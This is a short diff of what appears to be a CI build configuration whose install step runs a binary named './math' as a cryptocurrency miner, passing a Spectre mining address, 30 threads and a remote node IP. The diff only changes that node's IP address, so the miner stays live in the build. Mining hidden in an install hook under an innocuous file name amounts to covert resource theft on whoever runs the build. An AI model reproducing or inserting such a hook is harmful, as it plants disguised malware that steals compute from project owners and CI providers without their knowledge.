@@ -1,3 +1,3 @@
 dist: jammy
 install:
-- chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.173.20.107
+- chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37
